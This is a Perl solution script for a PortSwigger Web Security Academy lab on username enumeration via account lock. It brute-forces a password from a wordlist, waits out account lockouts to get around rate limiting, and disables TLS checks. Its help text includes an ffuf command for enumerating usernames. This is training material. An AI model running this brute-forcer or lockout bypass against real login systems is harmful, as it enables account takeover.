#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Username enumeration via account lock", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $wordlist,
    $username,
    $help,
);

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'w|wordlist=s'      => \$wordlist,
    'n|username=s'      => \$username,
    'h|help'            => \$help
);

pod2usage(1) if $help;
pod2usage(1) unless $url;
pod2usage(1) unless $wordlist;
pod2usage(1) unless $username;

our $ua = LWP::UserAgent->new(
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

open(my $fh, $wordlist) or die colored("[!!] Cannot open file '$wordlist': $!\n");

say colored("[!] This is just brute-forcing a password - remember to get a username candidate first", "magenta");

say colored("[*] Obtaining password length for user '$username', this may take a while...", "cyan");

while (my $pass = <$fh>) {
    chomp($pass);

    say "[*] Testing: $pass";

    if (&makeRequest($pass)) {
        say colored("[+] Found: $pass" , "green");
        exit;
    }
}

say colored("[-] Cannot obtain password with provided username and wordlist", "red");

sub makeRequest {
    my $password = shift;
    my $response = $ua->post($url, {username => $username, password => $password});

    if ($response->is_success || $response->status_line =~ /302 found/i) {
        if ($response->decoded_content =~ /You have made too many incorrect login attempts. Please try again in 1 minute/ig) {
            say colored("[zzz] Nap for 1 minute...", "blue");
            sleep(65);
            return &makeRequest($password);
        }
        return ($response->decoded_content =~ /Invalid username or password/ig) ? 0 : 1;
    } else {
        say STDERR colored($response->status_line, "on_red");
        return 0;
    }
}

__END__

=head1 SYNOPSIS

 $ perl broken-brute-force-protection.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --wordlist=<FILENAME>      Password wordlist file (required)
     --username=<USERNAME>      Obtained possible username (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

To get a username candidate you can use a tool such as ffuf (https://github.com/ffuf/ffuf) and a little deduction, for example:

$ ffuf -w wordlists/usernames.txt:USER -w wordlists/passwords.txt:PASS -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=USER&password=PASS' -u <URL HERE> -fr 'Invalid username or password'

You'll see messages with a recurring username - this could be it :)

=cut